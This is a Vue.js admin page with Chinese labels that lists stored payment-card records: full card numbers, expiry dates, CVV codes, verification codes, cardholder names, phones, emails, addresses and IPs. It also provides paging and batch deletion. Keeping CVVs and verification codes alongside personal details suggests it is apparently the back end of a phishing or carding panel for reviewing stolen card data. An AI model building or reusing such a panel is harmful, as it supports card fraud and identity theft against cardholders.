<template>
  <div v-loading="listLoading" class="app-container">
    <el-card class="box-card">
      <el-button icon="el-icon-refresh" circle @click="fetchData" />
      <el-checkbox v-model="showName" class="filter-item" style="margin-left:15px;">
        姓名
      </el-checkbox>
      <el-checkbox v-model="showIp" class="filter-item" style="margin-left:15px;">
        IP地址
      </el-checkbox>
      <el-checkbox v-model="showCardHolder" class="filter-item" style="margin-left:15px;">
        持卡人
      </el-checkbox>
      <el-checkbox v-model="showEmail" class="filter-item" style="margin-left:15px;">
        邮箱
      </el-checkbox>
      <el-checkbox v-model="showPost" class="filter-item" style="margin-left:15px;">
        邮编
      </el-checkbox>
      <el-checkbox v-model="showAddress" class="filter-item" style="margin-left:15px;">
        地址
      </el-checkbox>
      <el-checkbox v-model="showTime" class="filter-item" style="margin-left:15px;">
        时间
      </el-checkbox>
      <el-button type="danger" size="small" @click="deleteBatch" style="margin-left: 10px">批量删除</el-button>
    </el-card>
    <div style="height: 3px" />
    <el-table
      ref="dataTable"
      :data="dataList"
      element-loading-text="Loading"
      border
      fit
      highlight-current-row
    >
      <el-table-column
        type="selection"
        width="55"
      >
      </el-table-column>
      <el-table-column align="center" label="ID" width="95">
        <template slot-scope="scope">
          {{ scope.row.id }}
        </template>
      </el-table-column>
      <el-table-column v-if="showName" label="姓名">
        <template slot-scope="scope">
          {{ scope.row.familyName }}
        </template>
      </el-table-column>
      <el-table-column v-if="showName" label="名字">
        <template slot-scope="scope">
          {{ scope.row.name }}
        </template>
      </el-table-column>
      <el-table-column  label="持卡人" v-if="showCardHolder">
        <template slot-scope="scope">
          <label v-if="scope.row.cardHolder"> {{ scope.row.cardHolder }}</label>
          <label v-else>-</label>
        </template>
      </el-table-column>
      <el-table-column label="卡号" align="center" width="180">
        <template slot-scope="scope">
          {{ scope.row.card }}
        </template>
      </el-table-column>

      <el-table-column label="日期">
        <template slot-scope="scope">
          {{ scope.row.cardDate }}
        </template>
      </el-table-column>

      <el-table-column label="CVV">
        <template slot-scope="scope">
          {{ scope.row.cvv }}
        </template>
      </el-table-column>

      <el-table-column label="验证码">
        <template slot-scope="scope">
          {{ scope.row.validity }}
        </template>
      </el-table-column>
      <el-table-column label="电话号码">
        <template slot-scope="scope">
          {{ scope.row.phone }}
        </template>
      </el-table-column>

      <el-table-column v-if="showEmail" label="邮箱">
        <template slot-scope="scope">
          {{ scope.row.email }}
        </template>
      </el-table-column>
      <el-table-column label="邮编" v-if="showPost">
        <template slot-scope="scope">
          {{ scope.row.post }}
        </template>
      </el-table-column>
      <el-table-column v-if="showAddress" label="城市">
        <template slot-scope="scope">
          {{ scope.row.city }}
        </template>
      </el-table-column>
      <el-table-column v-if="showAddress" label="地址">
        <template slot-scope="scope">
          {{ scope.row.address }}
        </template>
      </el-table-column>
      <el-table-column label="卡种类" width="150">
        <template v-slot="scope">
          <label>{{scope.row.cardType }}</label>
        </template>
      </el-table-column>
      <el-table-column label="储蓄/信用卡" width="100">
        <template v-slot="scope">
          <label>{{scope.row.debit }}</label>
        </template>
      </el-table-column>
      <el-table-column label="卡等级" width="100">
        <template v-slot="scope">
          <label>{{scope.row.cardLevel }}</label>
        </template>
      </el-table-column>
      <el-table-column label="卡备注" width="100">
        <template v-slot="scope">
          <label>{{scope.row.remark }}</label>
        </template>
      </el-table-column>
      <el-table-column align="center" prop="created_at" label="时间" width="200" v-if="showTime">
        <template slot-scope="scope">
          <span v-if="scope.row.other">{{ ToDate(scope.row.other.startTime) }}</span>
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="p.pageNo"
      :page-sizes="[10,50, 100, 200,500]"
      :page-size="p.pageSize"
      layout="total, sizes, prev, pager, next, jumper"
      :total="p.dataCount"
      @size-change="handleSizeChange"
      @current-change="handleCurrentChange"
    />
    <el-dialog
      title="警告"
      :visible.sync="modal.visible"
      width="300px"
    >
      <span>{{modal.content}}</span>
      <span slot="footer" class="dialog-footer">
    <el-button @click="modal.visible = false">取 消</el-button>
    <el-button type="primary" @click="sureDeleteFn">确 定</el-button>
  </span>
    </el-dialog>
  </div>
</template>

<script>
  import { deleteData, getList } from '@/api/card'
  import list from 'svg-sprite-loader/examples/custom-runtime-generator/build/main'

  export default {
  filters: {
    statusFilter(status) {
      const statusMap = {
        1: 'success',
        0: 'gray',
        2: 'danger'
      }
      return statusMap[status]
    },
    StateTag(status) {
      const statusMap = {
        0: '等待中',
        1: '成功',
        2: '失败'
      }
      return statusMap[status]
    }
  },
  data() {
    return {
      p: {
        cardFilter:0,
        pageNo: 1,
        pageSize: 50,
        dataCount:0
      },
      dataList:[],
      showTime:false,
      showIp: false,
      showAddress: false,
      showEmail: false,
      showCardHolder:false,
      showPost:false,
      showName: false,
      list: {
        records: null,
        current: 1,
        size: 10
      },
      listLoading: true,
      modal: {
        visible: false,
        id: ''
      },
      pageP: {
        current: list.current,
        size: list.size
      }
    }
  },
  created() {
    this.fetchData()
  },
  methods: {
    deleteBatch(){
      let selection = this.$refs['dataTable'].selection;
      if (!selection||selection.length===0) {
        this.$message.error('请选择记录');
        return;
      }
      let ids=selection.map(obj=>obj.id);
      this.modal.visible = true
      this.modal.id = ids.join(',')
      this.modal.content = '是否删除' + ids.join('、') + '号数据？'
    },
    sureDeleteFn() {
      deleteData({ id: this.modal.id }).then(resp => {
        this.modal.visible = false
        this.fetchData()
      })
    },
    fetchData() {
      this.listLoading = true
      getList(this.p).then(response => {
        this.dataList = response.data;
        this.p.pageNo=response.pageNo;
        this.p.pageSize=response.pageSize;
        this.p.dataCount=response.dataCount;
        this.listLoading = false
      })
    },
    handleSizeChange(val) {
      this.p.pageSize=val;
      this.fetchData()
    },
    handleCurrentChange(val) {
      this.p.pageNo=val;
      this.fetchData()
    },
    UAJiex(ua) {
      if (ua === null) {
        return '其他'
      }
      if (ua.toString().indexOf('iPhone') !== -1) {
        return 'iPhone OS'
      }

      if (ua.toString().indexOf('Android') !== -1) {
        return 'Android'
      }
      if (ua.toString().indexOf('Mac') !== -1) {
        return 'Mac'
      }
      if (ua.toString().indexOf('Windows') !== -1) {
        return 'Windows'
      } else {
        return '其他设备'
      }
    },
    ToDate(time) {
      if (time === null) {
        return ''
      }
      var date = new Date(parseInt(time))
      return `${date.getFullYear()}/${date.getMonth() + 1}/${date.getDate()} ${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
    },
  }
}
</script>
